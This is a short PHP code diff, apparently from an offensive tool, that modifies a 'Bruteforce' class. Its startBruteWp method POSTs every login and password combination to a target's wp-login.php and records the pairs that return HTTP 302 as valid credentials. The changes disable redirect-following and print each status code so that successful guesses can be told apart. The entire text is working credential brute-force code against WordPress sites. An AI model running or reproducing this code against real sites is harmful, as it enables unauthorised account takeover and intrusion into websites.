@@ -55,6 +55,7 @@ class Bruteforce extends Main
 
     function startBruteWp($logins, $passwords)
     {
+        curl_setopt($this->ch, CURLOPT_FOLLOWLOCATION, 0);
         curl_setopt($this->ch, CURLOPT_URL, $this->target . "wp-login.php");
         foreach ($logins as $login) {
             foreach ($passwords as $password) {
@@ -62,6 +63,7 @@ class Bruteforce extends Main
                 curl_setopt($this->ch, CURLOPT_POSTFIELDS, $postData);
                 curl_exec($this->ch);
                 $httpcode = curl_getinfo($this->ch, CURLINFO_HTTP_CODE);
+                echo $httpcode . "\n";
                 if ($httpcode == 302)
                     array_push($this->result[$this->scid], array("login" => $login, "password" => $password));
             }
